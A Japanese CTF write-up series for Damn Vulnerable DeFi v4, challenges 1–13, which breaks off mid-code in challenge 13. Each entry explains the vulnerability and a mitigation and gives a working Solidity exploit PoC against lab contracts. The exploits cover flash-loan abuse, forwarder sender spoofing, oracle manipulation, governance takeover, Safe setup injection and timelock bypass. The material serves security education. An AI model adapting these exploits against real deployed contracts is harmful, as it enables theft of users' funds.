# Damn Vulnerable DeFi v4 Writeups
by tinamints

## 1. Unstoppable
無料のフラッシュローンを提供するERC4626のvault。残高に対する厳格な不変条件(常に成り立つべき条件)のせいでDoS攻撃を受ける。
### 目標 :
- vault を停止させる。
### 脆弱性 :
- `flashLoan`は`convertToShares(totalSupply) == balanceBefore`を要求する。これはvaultのトークン残高が`deposit`(sharesをmintする)経由でしか増えないという前提に立っている。直接`transfer`されると、sharesがmintされないまま残高だけが増えるためチェックが通らなくなり、結果としてすべての`flashLoan`がrevertする。
### 攻撃手順 :
- `token.transfer`で1 weiをvaultへ直接送り、チェックを壊す。
### 対策 :
- `token.balanceOf`に厳格な不変条件を結びつけない。ここでは単純に冗長な`convertToShares(totalSupply) != balanceBefore`のチェックを削除すればよい。セキュリティ上の意味はなく(返済をチェックしているのは`ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);`の方)。
### POC
```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

## 2. Naive Receiver
固定手数料1 WETHでメタトランザクションに対応したWETHフラッシュローンプール。他人名義でのローン実行と送信者の偽装が可能。
### 目標 :
- receiver(10 WETH)とプール(1000 WETH)の全WETHをrecovery へ移す。
### 制約 :
- 2トランザクション以内で完了する。
### 脆弱性 :
- 誰でも任意の`receiver`を指定して`flashLoan`を呼べ、receiverはローンを開始した人を確認しない。そのためreceiverに1 WETHの手数料を何度も払わせることができ、手数料はすべてプールの`feeReceiver`(deployer)に入る。
- `withdraw`は`_msgSender()`を使い、trusted forwarder経由の呼び出しではcalldataの末尾20バイトを信用する。forwarder + `multicall`経由で任意のアドレスを末尾に付ければ、deployerとして引き出せる(プール全額を引き出せるだけの残高を持つのはdeployerだけ)。
### 攻撃手順 :
- 金額0の`flashLoan`をreceiver宛てに10回、1つの`multicall`にまとめて実行し、receiverの10 WETHを手数料としてdeployerの預金へ移す。
- deployerとしてプールの全残高を引き出し、recoveryへ送る。trusted forwarder経由のリクエストに、`withdraw`のcalldata末尾へdeployerのアドレスを偽装して付加することで実現する。
### 対策 :
- flash loanを実際に開始した人を認証する(receiverが自分で頼んでいないローンの手数料を負担させられないようにする)。また`withdraw`ではforwarder経由の`_msgSender()`を信用せず、適切なアクセス制御と信頼できるforwarderの検証を行う。
### POC
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    // receiverに手数料を10回払わせて空にする
    bytes[] memory data = new bytes[](10);
    for (uint256 i = 0; i < 10; i++) {
        data[i] = abi.encodeWithSignature(
            "flashLoan(address,address,uint256,bytes)",
            address(receiver),
            address(weth),
            0,
            ""
        );
    }
    pool.multicall(data);

    // deployerのアドレスを「from」として末尾に偽装したwithdraw呼び出しを作る
    bytes memory withdrawCall = abi.encodeCall(
        pool.withdraw, (weth.balanceOf(address(pool)), payable(recovery))
    );
    bytes memory forgedCall = abi.encodePacked(withdrawCall, deployer);

    bytes[] memory calls = new bytes[](1);
    calls[0] = forgedCall;

    bytes memory multicallData = abi.encodeCall(pool.multicall, (calls));

    // forwarderへのリクエストに署名する
    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 100_000,
        nonce: forwarder.nonces(player),
        data: multicallData,
        deadline: block.timestamp + 1 days
    });

    // _hashTypedDataはforwarder内部用なので、EIP-712のdigestを手動で作るする
    bytes32 structHash = forwarder.getDataHash(request);
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory signature = abi.encodePacked(r, s, v);

    // 偽装したcalldataでforwarderのリクエストを実行する
    forwarder.execute(request, signature);
}
```

## 3. Truster
借り手の代わりに任意の呼び出しを行うDVTフラッシュローンプール。検証されていない外部呼び出しの脆弱性がある。
### 目標 :
- プールの全DVTをrecoveryへ移す。
### 制約 :
- 1トランザクションで完了する。
### 脆弱性 :
- `flashLoan(amount, borrower, target, data)`はプールを`msg.sender`として`target.functionCall(data)`を実行し、借入額は0でもいい。つまり誰でもプールに任意のコントラクトの任意の関数を呼ばせられる。
### 攻撃手順 :
- `target = token`、`data = approve(attacker, 全トークン)`で0 DVTを借り、プール自身に攻撃者をapproveさせる。その後`transferFrom`で全額をrecoveryへ送る。両方を1つの攻撃コントラクト内で行うので1トランザクションになる。
### 対策 :
- poolが自身の権限で任意の`target.call(data)`を実行できないようにする。ユーザーが指定できる任意の呼び出しを廃止するか、target/selectorをホワイトリストで制限し、トークンの approve 関数を呼び出せないようにする。
### POC
```solidity
function test_truster() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
    attacker.attack();
}

contract Attacker {
    TrusterLenderPool private pool;
    address private recovery;
    DamnValuableToken private token;
    uint256 private TOKENS_IN_POOL;

    constructor(
        TrusterLenderPool _pool,
        address _recovery,
        DamnValuableToken _token,
        uint256 _TOKENS_IN_POOL
    ) {
        pool = _pool;
        recovery = _recovery;
        token = _token;
        TOKENS_IN_POOL = _TOKENS_IN_POOL;
    }

    function attack() external {
        // token.approve(attacker, 全トークン) のcalldataを組み立てる
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );

        // プール自身にapproveさせ、自分がトークンを使えるようにする
        pool.flashLoan(0, address(this), address(token), data);

        // approveされたトークンをすべてrecoveryに送る
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
```

## 4. Side Entrance
無料でフラッシュローンを利用できる ETH プール。預け入れでローンを返済できてしまう脆弱性がある。
### 目標 :
- プールの全ETHをrecoveryへ移す。
### 脆弱性 :
- `flashLoan`はプールのETH残高が元に戻ったかだけを確認し、どうやって戻ったかは構わない。借りたETHを`deposit`すると返済扱いになり、しかもその際で攻撃者の`balances`も増える。
### 攻撃手順 :
- 1000 ETHをすべてフラッシュローンで借り、`execute`内でそれを`deposit`する。ローンのチェックは通り、攻撃者の残高は1000 ETHになる。`withdraw`してETHをrecoveryへ送る。
### 対策 :
- ローン中の`deposit`を返済扱いにしない。`flashLoan`と`deposit`にreentrancy guardを入れるか、返済の確認をユーザーの預金と分けて管理する。
### POC
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
    exploit.exploit();
}

contract SideEntranceExploit  {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function exploit() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);

        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    function execute() external payable {
        // この deposit によって返済チェックを通し、withdraw() に必要な残高も確保できる
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

## 5. The Rewarder
DVT と WETH の報酬をマークルプルーフで配布するディストリビューター。同じ報酬を複数回請求できてしまう脆弱性がある。

*答えは `https://github.com/RealJohnnyTime/damn-vulnerable-defi-v4-solutions/tree/master/test/the-rewarder` から。
### 目標 :
- ディストリビューターからできる限り多くの資金をrecoveryへ移す。
### 制約 :
- プレイヤーはbeneficiariesに登録されているので請求できる。
### 脆弱性 :
- `claimRewards`は請求のリストを受け取るが、「請求済み」ビットチェックはトークンが切り替わる時か最後の請求の時にしか行わない。1回の呼び出し内での同一トークン・同一バッチの重複請求は互いにチェックされない。
### 攻撃手順 :
- プレイヤーの正当なDVT請求(マークルプルーフ付き)をDVTが空になるまで繰り返した配列を作り、WETHも同様にする。`claimRewards`を呼び、すべてをrecoveryへ送る。
### 対策 :
- claimを処理する前(またはループ内)で使用済みフラグ(claimed bit)を立て、同一(token, batch)の重複claimを拒否する。これで1回の呼び出しで同じ報酬を何度もclaimできなくなる。
### POC
```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // DVT配布のJSONを読み込む
    string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));

    // WETH　JSONを
    string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
    Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));

    // leafを読み込む
    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    // プレイヤーの報酬額とleafを探す
    uint256 playerDvtAmount;
    bytes32[] memory playerDvtProof;
    uint256 playerWethAmount;
    bytes32[] memory playerWethProof;
    // dvtRewards.length == wethRewards.length だと仮定している
    for (uint i = 0; i < dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            playerDvtAmount = dvtRewards[i].amount;
            playerWethAmount = wethRewards[i].amount;
            playerDvtProof = merkle.getProof(dvtLeaves, i);
            playerWethProof = merkle.getProof(wethLeaves, i);
            break;
        }
    }
    require(playerDvtAmount > 0, "Player not found in DVT distribution");
    require(playerWethAmount > 0, "Player not found in WETH distribution");

    // 請求するトークンを準備する
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // 配布総額とプレイヤーの取得額から、必要な請求回数を計算する
    uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount) +
        (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
    uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
    Claim[] memory claims = new Claim[](totalClaimsNeeded);

    // すべてのclaimを組み立てる
    // totalClaimsNeeded = 100、dvtClaims = 60ならwethClaims = 40
    // この配列はFoundryのデフォルトgas limitを超えるので、テスト時は --gas-limit 9999999999999999 を付ける
    for (uint256 i = 0; i < totalClaimsNeeded; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
            tokenIndex: i < dvtClaims ? 0 : 1,
            proof: i < dvtClaims ? playerDvtProof : playerWethProof
        });
    }

    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

## 6. Selfie
トークン投票によるガバナンスで管理される DVT フラッシュローンプール。フラッシュローンで一時的に借りたトークンの投票権を利用できてしまう脆弱性がある。
### 目標 :
- プールの全DVTをrecoveryへ移す。
### 脆弱性 :
- ガバナンスはその時点で投票権の過半数を持っていれば誰でもアクションをキューに登録できる。プールには全資金を任意の宛先へ送る`emergencyExit`(ガバナンスのみ呼び出し可能)がある。しかも投票権はプール自身からも借りられる。
### 攻撃手順 :
- プールの全トークンをフラッシュローンで借り、自分に投票権をdelegateして`emergencyExit(recovery)`をガバナンスアクションとしてキューに登録する。ローンを返済し、`vm.warp`で2日の遅延期間を飛ばしてからアクションを実行する。
### 対策 :
- 投票権は proposal作成前に保有していたcheckpoint/時間加重の残高で計算する。これで1ブロック内でflashloanした残高が定足数に達しなくなる。
### POC
```solidity
function test_selfie() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, governance, token, recovery);
        attacker.attack();

        // 2日間のアクション遅延
        vm.warp(block.timestamp + 2 days);

        governance.executeAction(1);
    }

contract Attacker is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableVotes private token;
    address private recovery;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
    }

    // flashLoan中にプールから呼ばれる
    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bytes32)
    {
        // 投票権を得る
        token.delegate(address(this));

        // emergencyExitを呼ぶアクションをキューに登録する
        bytes memory emergencyExitData = abi.encodeWithSignature("emergencyExit(address)", recovery);
        governance.queueAction(address(pool), 0, emergencyExitData);

        // プールに返済する
        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

## 7. Compromised
3つの価格情報の提供元から取得した価格の中央値を使うorcleによって価格を決定する NFT 取引所。orcleの秘密鍵が漏洩している。
### 目標 :
- 取引所の全ETH(999 ETH)をrecoveryへ移す。
### 制約 :
- プレイヤーは最終的にNFTを保有しないこと。
- NFT価格は最終的に元のままであること。
### 脆弱性 :
- 漏洩した2つのhex文字列をデコード(hex → base64 → 文)すると、3つのoracleのうち2つの秘密鍵になる。価格は3つの中央値なので、2つを支配すれば価格も支配できる。
### 攻撃手順 :
- 2つの鍵で価格を0に設定し、1 weiでNFTを1つ購入、価格を元の999 ETHに戻してNFTを999 ETHで売却し、ETHをrecoveryへ送る。
### 対策 :
- oracleの秘密鍵を安全に保管し、複数の独立した価格情報の提供元を乖離チェック付きで集約する(例: Chainlink)。数個のoracleが漏洩/支配されても価格を決められないようにする。
### POC
```solidity
function test_compromised() public checkSolved {
        // 価格を0にして安く買い、高く売る
        // デコードした2つのoracleの秘密鍵
        address source1 = sources[0]; // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
        address source2 = sources[1]; // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();

        nft.approve(address(exchange), nftId);
        vm.stopPrank();

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(player);
        exchange.sellOne(nftId);

        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
```

## 8. Puppet
流動性の低い Uniswap V1 プールから担保価格を取得する DVT レンディングプール。スポット価格oracleを操作される脆弱性がある。
### 目標 :
- レンディングプールの全DVTをrecoveryへ移す。
### 制約 :
- 1トランザクションで完了する。
### 脆弱性 :
- プールは借りるDVTの2倍の価値のETH担保を要求し、その価格にUniswap V1のスポット価格(ETH残高 / DVT残高のペア)を使う。ペアには10 ETH / 10 DVTしかないため、1回の大きなスワップで価格が大きく動く。
### 攻撃手順 :
- EIP-2612の`permit`署名(署名によるapprove。別途`approve`のtxが不要)でプレイヤーの1000 DVTを引き取り、攻撃コントラクト内でUniswap V1に売ってDVT価格を暴落させ、わずかになった担保で10万DVTを全額借りてrecoveryへ送る。
### 対策 :
- 価格はUniswap V1の即時spot reservesではなく、操作されにくいoracle(TWAP / Chainlink)から取得する。
### POC
```solidity
function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
        address(token),
        address(lendingPool),
        address(uniswapV1Exchange),
        recovery
        );

        // EIP-2612のpermitを準備する
        uint256 deadline = block.timestamp + 1 days;
        uint256 value    = type(uint256).max;
        uint256 nonce    = token.nonces(player);

        bytes32 PERMIT_TYPEHASH = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );

        bytes32 structHash = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                player,
                address(attacker),
                value,
                nonce,
                deadline
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                token.DOMAIN_SEPARATOR(),
                structHash
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);

        // 1トランザクション制限
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }

    contract PuppetPoolAttacker {
    DamnValuableToken public immutable token;
    PuppetPool public immutable lendingPool;
    IUniswapV1Exchange public immutable uniswapV1Exchange;
    address public immutable recovery;

    constructor(
        address _token,
        address _lendingPool,
        address _uniswapV1Exchange,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        lendingPool = PuppetPool(_lendingPool);
        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
        recovery = _recovery;
    }

    function attack(
        address player,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable {

        token.permit(
            player,
            address(this),
            type(uint256).max,
            deadline,
            v,
            r,
            s
        );

        require(msg.value == 25 ether, "NO ETH RECEIVED");

        uint256 playerTokens = token.balanceOf(player);
        token.transferFrom(player, address(this), playerTokens);

        uint256 attackerTokens = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), attackerTokens);

        uniswapV1Exchange.tokenToEthTransferInput(
            attackerTokens,
            9,
            block.timestamp + 1,
            address(this)
        );

        uint256 poolTokens = token.balanceOf(address(lendingPool));

        lendingPool.borrow{ value: 20 ether }(
            poolTokens,
            recovery
        );
    }

    receive() external payable {}
}
```

## 9. Puppet V2
Uniswap V2のリザーブからWETH担保の価格を取るDVTレンディングプール。スポット価格オラクルの操作に弱い。
### 目標 :
- レンディングプールの全DVTをrecoveryへ移す。
### 脆弱性 :
- プールは借りるDVTの3倍の価値のWETH担保を要求し、その価格にUniswap V2の`getReserves`によるスポット価格を使う。ペアは小さい(100 DVT / 10 WETH)ので、プレイヤーの1万DVTを売ると価格が暴落する。
### 攻撃手順 :
- Uniswap V2で1万DVTをすべてETHに売り、ETHをWETHにwrapし、少なくなった担保をapproveして100万DVTを借り、recoveryへ送る。
### 対策 :
- Puppetと同じ: 担保の評価にはUniswap V2の`getReserves`のspot価格ではなく、TWAPや外部oracleを使う。
### POC
```solidity
function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // 全トークンを売って価格を暴落させる
        uint256 tokensToSell = token.balanceOf(player);
        uniswapV2Router.swapExactTokensForETH(
            tokensToSell,
            0,
            path,
            player,
            block.timestamp + 1
        );

        // 必要なWETHを確認してから安く借りる
        uint256 poolTokens = token.balanceOf(address(lendingPool));
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);

        // ETHをWETHに変える
        uint256 ethBalance = address(player).balance;
        require(ethBalance >= requiredWETH, "Not enough ETH after swap");

        weth.deposit{value: ethBalance}();

        weth.approve(address(lendingPool), requiredWETH);

        lendingPool.borrow(poolTokens);

        uint256 borrowedTokens = token.balanceOf(player);
        token.transfer(recovery, borrowedTokens);
    }
```

## 10. Free Rider
6つのNFTを1っ15 ETHで売るNFTNFT取引所。`buyMany`の支払いロジックが壊れている。
### 目標 :
- 取引所の全NFTを奪取し、recovery managerへ渡す。
- プレイヤーがbounty(45 ETH)を獲得する。
### 脆弱性 :
- `buyMany`は`msg.value >= price`をNFT 1つ分に対してしかチェックしないので、15 ETHを1回払うだけで6つすべてのチェックを通る。
- さらに、NFTを買い手に転送してから所有者に支払うため、売り手に支払われるはずの代金が買い手に送られてしまう。
### 攻撃手順 :
- Uniswap V2から15 WETHをフラッシュスワップで借りてunwrapし、15 ETHで6枚すべてを購入(代金として90 ETHが戻ってくる)。NFTをrecovery managerへ送って45 ETHのbountyを受け取り、フラッシュスワップを手数料込みで返済する。
### 対策 :
- 各NFTの価格の合計を請求し、代金は売り手に送る。checks-effects-interactionsの順序に従う。
### POC
```solidity
 function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace),
            address(recoveryManager),
            address(nft),
            address(uniswapPair),
            address(token),
            address(weth),
            address(player)
        );
        // flashLoanInitilizerを呼んで15 ETHのflashloanを取得する(1つ分の価格だけで済む)
        attacker.flashLoanInitilizer(15 ether);
    }

contract flashLoanUser is IUniswapV2Callee, IERC721Receiver {

FreeRiderNFTMarketplace public immutable marketplace;
FreeRiderRecoveryManager public immutable recoveryManager;
DamnValuableNFT public immutable nft;
IUniswapV2Pair public immutable pair;
address public immutable token;
address public immutable weth;
address public immutable player;

    constructor(
        address _marketplace,
        address _recoveryManager,
        address _nft,
        address _pair,
        address _token,
        address _weth,
        address _player
    ) {
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        recoveryManager = FreeRiderRecoveryManager(payable(_recoveryManager));
        nft = DamnValuableNFT(_nft);
        pair = IUniswapV2Pair(_pair);
        token = _token;
        weth = _weth;
        player = _player;
    }

    receive() external payable {}

    function flashLoanInitilizer(uint256 amount) external {
        // 借りるべき正しいトークンを探す
        address token0 = pair.token0();
        address token1 = pair.token1();

        uint256 amount0Out = 0;
        uint256 amount1Out = 0;

        if (token0 == address(weth)) {
            amount0Out = amount;
        } else {
            amount1Out = amount;
        }

        // swapを呼んでflashloanを起動する
        pair.swap(amount0Out, amount1Out, address(this), abi.encode(amount));
    }

    // pairコントラクトから呼ばれる
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
        ) external override {
        
        require(msg.sender == address(pair), "Invalid caller");

        uint256 wethBorrowed = abi.decode(data, (uint256));

        // NFTを買うためWETHをETHに変える
        WETH(payable(weth)).withdraw(wethBorrowed);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 ether}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
        }

        // flashloanを返済するためWETHに戻す
        uint256 ethBalance = address(this).balance;
        WETH(payable(weth)).deposit{value: ethBalance}();

        uint256 amountToRepay = ((wethBorrowed * 1000) / 997) + 1;

        IERC20(weth).transfer(address(pair), amountToRepay);

        uint256 remainingWETH = IERC20(weth).balanceOf(address(this));

        if (remainingWETH > 0) {
            WETH(payable(weth)).withdraw(remainingWETH);
            payable(player).transfer(address(this).balance); // 残りのETHをすべてplayerへ送る
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

## 11. Backdoor
4人のbeneficiaryそれぞれのために作られたSafe walletへ10 DVTを報酬として支払うregistryコントラクト。walletのsetup中に呼び出しを注入できる。
### 目標 :
- registryコントラクトの全40 DVTをrecoveryへ移す。
### 制約 :
- 1トランザクションで完了する。
### 脆弱性 :
- 誰でも`createProxyWithCallback`でbeneficiaryのためにSafeを作れ、registryはその新しいwalletに支払う。registryはownerとthresholdはチェックするが、Safeの`setup()`の任意項目`to`/`data`はチェックしない。これにより新しいwalletは任意のコントラクトへdelegatecallする。
### 攻撃手順 :
- 4人のユーザーそれぞれについて、`setup()`から攻撃者が用意した攻撃コントラクトへ`delegatecall`するSafeを作成し、walletに攻撃者へのDVTの`approve`を実行させる。registryがwalletに10 DVTを送ると、攻撃者はすぐに`transferFrom`でそのDVTをrecoveryへ送る。すべての処理は攻撃者のコンストラクタ内に 1トランザクションで完了する。
### 対策 :
- registryは任意の`initializer` calldataを信用せず、支払い前に新しいwalletのsetup(想定どおりのowner、module/delegatecall/埋め込み呼び出しが無いこと)を検証する。
### POC
```solidity
function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory),
            address(singletonCopy),
            address(walletRegistry),
            address(token),
            recovery,
            users
        );
    }

    // Safeから呼ばれる
contract Initializer {
    function approveTokens(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract Attacker {
    constructor(
        address _walletFactory,
        address _singletonCopy,
        address _walletRegistry,
        address _token,
        address _recovery,
        address[] memory users
    ) {
        Initializer init = new Initializer();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // `approveTokens`呼び出しをエンコードする
            bytes memory setupData = abi.encodeWithSelector(
                init.approveTokens.selector,
                _token,
                address(this)
            );

            // Safe.setup()の`to`/`data`項目にapproveTokens呼び出しを注入してエンコードする
            bytes memory initData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,          // owners
                1,               // threshold
                address(init),   // to: setup中に呼ばれる
                setupData,       // data: このコントラクトがwalletのトークンを使えるようapproveする
                address(0),      // fallbackHandler
                address(0),      // paymentToken
                0,               // payment
                address(0)       // paymentReceiver
            );

            // proxyをデプロイする: WalletRegistry.proxyCreated()のコールバックがwalletに10 DVTを送る
            address proxy = address(
                SafeProxyFactory(_walletFactory).createProxyWithCallback(
                    _singletonCopy,
                    initData,
                    i, // saltNonce
                    IProxyCreationCallback(_walletRegistry)
                )
            );

            // registryがwalletに送った10 DVTを引き出す(4回ループして合計40 DVT)
            IERC20(_token).transferFrom(proxy, _recovery, IERC20(_token).balanceOf(proxy));
        }
    }
}
```

## 12. Climber
Timelockが所有するUUPSアップグレード可能なVault。Timelockが操作のスケジュールを確認する前に、その操作を実行してしまう。
### 目標 :
- vaultの全DVTをrecoveryへ移す。
### 脆弱性 :
- `ClimberTimelock.execute()`はすべての呼び出しを先に実行し、その後でoperationがスケジュール済みで実行可能かを確認する。そのため、一連の呼び出し実行中に自分自身をスケジュールできる。さらにtimelockがvaultの所有者なので、その呼び出しでvaultをアップグレードできる。
### 攻撃手順 :
- 1つの一連の呼び出しを実行する:1.遅延を0に設定 2.攻撃コントラクトにproposer役を付与 3.vaultを悪意のあるロジックにアップグレード 4.攻撃コントラクトを呼び、同じ一連の呼び出しを`schedule`させて最後のチェックを通す。その後アップグレード済みvaultの`sweepFunds`を呼び、全額をrecoveryへ送る。
### 対策 :
- operationがスケジュールされ、実行可能であることをexecuteの前に確認する(外部呼び出しの前にexecutedと記録する)。スケジュール→executeの順序を強制する。
### POC
```solidity
function test_climber() public checkSolvedByPlayer {
    MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();

    ClimberAttack attackContract = new ClimberAttack(
        payable(address(vault)),
        payable(address(timelock)),
        recovery,
        address(token)
    );

    attackContract.attack(address(maliciousImpl));
}

contract MaliciousVaultImpl is ClimberVault {
    function sweepFunds(address token, address to) external {
        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }
}

contract ClimberAttack {
    ClimberVault private immutable vault;
    ClimberTimelock private immutable timelock;
    address private immutable recovery;
    address private immutable token;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private constant SALT = bytes32(0);

    constructor(address payable _vault, address payable _timelock, address _recovery, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(_timelock);
        recovery = _recovery;
        token = _token;
    }

    function attack(address maliciousImpl) external {
        // timelockのdelayを0に設定する
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // この攻撃コントラクトにproposer役を付与する
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
        );

        // vaultを悪意のあるロジックにアップグレードする
        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
        );

        // このコントラクトを呼び戻して、同じ一連の呼び出しをscheduleさせる
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("scheduleAll()"));

        // 一連の呼び出し全体を実行する
        timelock.execute(targets, values, dataElements, SALT);

        // vaultから資金を引き出す
        MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
    }

    // 実行中の一連の呼び出し自身をscheduleするため、timelockから呼ばれる
    function scheduleAll() external {
        timelock.schedule(targets, values, dataElements, SALT);
    }
}
```

## 13. Wallet Mining
認可済みアドレスにSafeをデプロイすると報酬を払うwallet deployer。storageの衝突で再初期化できてしまう。
### 目標 :
- ユーザーの入金アドレスにある2000万DVTを全額ユーザーへ回収し、wallet deployerの報酬をwardへ移動。
### 制約 :
- ユーザーはトランザクションを送ってはいけない。プレイヤーは1回しか送れない。
### 脆弱性 :
- `AuthorizerUpgradeable`の`needsInit`はstorage slot 0にあり、proxyの`upgrader`アドレス(常に非ゼロ)と衝突している。そのため誰でも`init()`を再度呼び出して自分自身のアドレスを認可できる。
- `WalletDeployer.drop()`は選んだ`(wat, nonce)`の組がCREATE2で認可済みアドレスにデプロイされるかしかチェックしないので、正しいnonceをbrute-forcedで見つけられる。
### 攻撃手順 :
- `init()`を再度呼んで攻撃者を`USER_DEPOSIT_ADDRESS`について認可させ、factoryがそこへデプロイするnonceをbrute-forcedで見つけ、`drop()`で本物のSafe(ownerは`user`)をデプロイする。ユーザーの署名で`execTransaction`を使ってユーザーのDVTを引き出し、deployerの報酬を`ward`に転送する。すべて攻撃者のconstructor内で行う。
### 対策 :
- init flagは衝突しない専用slotに保持し(OZの`Initializable`を使う)、`init()`の再実行を防ぐ。また、deploy済みwalletのownerを検証する前に、予測アドレスへ資金を送らない。
### POC
```solidity
function test_walletMining() public checkSolvedByPlayer {
    new Attacker(address(token), address(authorizer), address(walletDeployer), user, userPrivateKey, ward);
}

// 'hevm.sign(userPrivateKey, txHash)' のために使う
interface IHevm {
    function sign(uint256 privateKey, bytes32 digest) external pure returns (uint8 v, bytes32 r, bytes32 s);
}

contract Attacker {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    IHevm constant hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor(
        address token,
        address authorizer,
        address walletDeployer,
        address user,
        uint256 userPrivateKey,
        address ward
    ) {
        // 1. 自分を認可させる
        getAuthorized(authorizer);

        // 2. nonceを見つける
